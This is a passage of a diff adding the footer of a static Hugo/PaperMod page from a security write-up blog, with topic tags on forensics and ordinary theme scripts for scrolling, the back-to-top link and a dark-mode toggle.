+      <li><a href="http://localhost:1313/tags/dfir/">DFIR</a></li>
+      <li><a href="http://localhost:1313/tags/endpoint-forensics/">Endpoint Forensics</a></li>
+      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
+      <li><a href="http://localhost:1313/tags/cyberdefenders/">CyberDefenders</a></li>
+      <li><a href="http://localhost:1313/tags/volatility/">Volatility</a></li>
+      <li><a href="http://localhost:1313/tags/ftk-imager/">FTK Imager</a></li>
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">Duy Nguyen | Security Write-ups</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
